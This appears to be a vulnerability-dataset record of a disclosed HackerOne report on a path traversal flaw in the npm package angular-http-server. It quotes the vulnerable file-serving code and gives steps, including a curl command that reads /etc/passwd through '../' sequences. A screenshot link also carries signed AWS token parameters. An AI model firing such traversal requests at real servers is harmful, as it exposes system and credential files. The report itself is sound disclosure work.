{
  "reported_to": "Node.js third-party modules",
  "reported_by": "bl4de ",
  "title": "[angular-http-server] Path Traversal in angular-http-server.js allows to read arbitrary file from the remote server",
  "content": "\nHi Guys,\nangular-http-server (https://www.npmjs.com/package/angular-http-server) contains Path Traversal vulnerability, which allows malicious user to read content of any file with known path.\nModule:\nA very simple application server designed for Single Page App (SPA) developers.\n(https://www.npmjs.com/package/angular-http-server)\nDescription\nangular-http-server does not sanitize path in the correct way, so curl can be used to retrieve content of any file from the remote server.\nVulnerable code in angular-http-server.js file (lines 66-82):\nCode 635 Bytes\n1fs.stat(possibleFilename, function(err, stats) {\n2        var fileBuffer;\n3        if (!err && stats.isFile()) {\n4            fileBuffer = fs.readFileSync(possibleFilename);\n5            let ct = mime.lookup(possibleFilename);\n6            console.log(`Sending ${possibleFilename} with Content-Type ${ct}`);\n7            res.writeHead(200, { 'Content-Type': ct });\n8\n9        } else {\n10            console.log(\"Route %s, replacing with index.html\", possibleFilename);\n11            fileBuffer = returnDistFile();\n12            res.writeHead(200, { 'Content-Type': 'text/html' });\n13        }\n14\n15        res.write(fileBuffer);\n16        res.end();\n17    });\nFile with possibleFilename name is read and send with guessed mime type. No path or allowed mime type validation is implemented - if it's possible to read the file, code just does it.\nSteps To Reproduce:\ninstall angular-http-server\nCode 33 Bytes\n1$ npm install angular-http-server\ncreate static index.html file (required as starting point of an app:\nCode 161 Bytes\n1<html>\n2\n3<head>\n4    <meta charset=\"utf8\">\n5    <title>Index HTML</title>\n6</head>\n7\n8<body>\n9    <div>\n10        <p>This is index.html :)</p>\n11    </div>\n12</body>\n13\n14</html>\nrun server in the same folder where index.html was created:\nCode 31 Bytes\n1$ angular-http-server --path ./\nopen the browser and go to 127.0.0.1:8080 You should see HTML output.\nfrom the terminal, execute folloiwng command (please adjust numbers of ../ to your system):\nCode 70 Bytes\n1$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../etc/passwd\nYou should see the content of /etc/passwd file:\n<image_0>\nAlso, in the angular-http-server log there is information about mime type of the file (application/octet-stream):\nCode 201 Bytes\n1$ ./node_modules/angular-http-server/angular-http-server.js --path ./\n2Path specified: ./\n3Using index.html\n4Listening on 8080\n5Sending ../../../../../etc/passwd with Content-Type application/octet-stream\n6\nSupporting Material/References:\nConfiguration I've used to find this vulnerability:\nmacOS HighSierra 10.13.3\nnode 8.9.3\nnpm 5.5.1\ncurl 7.54.0\nWrap up\nI hope this report will help to keep Node ecosystem more safe. If you have any questions about any details of this finding, please let me know in comment.\nThank you\nRegards,\nRafal 'bl4de' Janicki\nImpact\nThis vulnerability allows malicious user to read content of any file on the machine where angular-http-server is running.\nThis might expose vectors to attack system with Remote Code Execution, reveals files with usernames and passwords and many other possibilites.\n\n",
  "severity": [
    8.6,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Path Traversal"
  ],
  "screenshots": {
    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/257/351/ec2b7172584f64a4ebc3eea0ccb39684ee58c957/1.png?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQY65IP7J5%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T174651Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIFWSzpGBw0gpxrV1Rg20EGdMeClH35vXtLZx7i01ff%2FUAiEA9zvCJ48YaiuF4%2FSBNZYPeujj5w74UuyL%2BWQYdFHCIagqsgUIMhADGgwwMTM2MTkyNzQ4NDkiDKKL73KbRO0XvzYeBSqPBUvm0o0r3FB%2B2yu69YvhXQIxl3VLF6eFtMJQbnngi8WsN2yQuluAkfz%2B%2F8rAWTPRk65oAs3y8NUp4JBXQH%2F81iqB6YsdRHICNBzLSKTUjt3M%2FNRcogqGt0Jr4zaFfjoGeEeu7W4%2F1iiOawdA%2B7BvBTexlVzRnXFQtMItqbC%2BD8PIrrn1FW%2BF4GGcSHd101XaGhRypDfbXeCqB0WRDG9%2BmLcnw3iDWpMw29K8xo5Y8d2FqPC%2BeAjtX%2FpXD5XtgYIFjjmrIuFRZvpfx%2FME8ni25LcHIJMMFuf1ESWV%2FqpP%2FnSZZtZpKOtSns6RgjnQLvTLaLjnOh9mr1dacs1%2Brlyngle220bxuyxabqsFue%2BIJqCCWeiig4yBvFsHKPbt8hL32p5dLq6kva%2FzNd5ZQ1TJB4N%2BZvg47L2LRTxnPf4MCWcm%2FhBhg0%2BSTfnm2N8uV083kajVeYi8j2W2gf9ESQyf1qorTdAsHuQmfgcvfHifRixObbdPdRRSS%2Bctu4wToXdBVVmzo5VHv32mg%2Fz8X5Z8WjSyh6L0QvPVSedxqClAo1PFUqt3r3ErYaJJreMAQC53zDO1U4lLwzYwrTWckamCWaoXIAlqILNfL6xIHJJU60gil5DK5H0c8fBcJcm%2BkX%2BcPO33ZvTFhTaExQYWSGeDctaHSWTlngWJWq4e26Kn9VtQ0xpPmBZhzL%2FFGSnJ0K8WzdoIdShiSCpPMBbJ2NR3SXDDnYlI8ogQAyH356zv19hPHwbog2jEPxX%2B0uNKlAF0pqzPLjfs52sgdumxInuljr%2FOqzV7Dl3i%2F6yfKYEe3smtCsOWpNpRsBQeZiBC2SnS0Mr%2FUsoL1vOfcROkEYHjS%2F6QuuDAbOddhzJVV%2FCKJOIw79WQvwY6sQEsdyk4wYBVQdsV346TE09lBBtkPiwytdTXoJSHxNvQrPIiOH%2F%2B3g0PQDxHYgdg9FgNzcnW6ZJXKAnyxKILMXmXgIgVHYqXAj9wmKeMC%2F5OBd1FRcLjhvPJM9vYU6oFSy3W2k7l2DhIyCBToR2G16rpOgfSejCS2Of9RNEH%2BkStTHmXIxMZHt6xzYaqpG1a%2BKZeXtdigH74gZQPo3wPrLYbmj1yEfdP5PkUyskYa04Vr4k%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2320286be9eefdae0153cc63745d0bc9b46a95452376d236827cc5fc05ee6b2f"
  },
  "disclosed_date": 1519960440,
  "report_url": "https://hackerone.com/reports/309120",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Install angular-http-server: npm install angular-http-server"
    ],
    [
      2,
      "Create a static index.html file in the same directory"
    ],
    [
      3,
      "Run the server: angular-http-server --path ./"
    ],
    [
      4,
      "Access the server at 127.0.0.1:8080 to verify it's running"
    ],
    [
      5,
      "Use curl to exploit the path traversal: curl -v --path-as-is http://127.0.0.1:8080/../../../../../etc/passwd"
    ]
  ],
  "vuln_description": "The angular-http-server module contains a path traversal vulnerability that allows an attacker to read arbitrary files on the server by manipulating the file path in the request. The server does not properly sanitize the path, allowing access to files outside the intended directory.",
  "reason": "The vulnerability is straightforward to discover as it involves a common path traversal technique and does not require complex interactions or state manipulation. The attack is simple and relies on a well-known vulnerability pattern.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}